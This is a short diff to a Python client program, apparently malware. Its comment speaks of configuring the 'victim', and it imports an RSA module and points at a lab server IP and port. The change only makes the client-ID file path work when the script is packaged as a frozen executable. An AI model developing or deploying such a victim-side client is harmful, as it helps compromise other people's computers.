@@ -6,7 +6,14 @@ import RSA_algorithm
 #setup configure for victim
 SERVER_IP = "192.168.56.1"
 SERVER_PORT = 6967
-CLIENT_ID_FILE = ".client_uuid"
+
+if getattr(sys, "frozen", False):
+    BASE_DIR = os.path.dirname(sys.executable)
+else:
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+CLIENT_ID_FILE = os.path.join(BASE_DIR, ".client_uuid")
+
 
 #checking type os for path handling using sys.platform
 platform = sys.platform
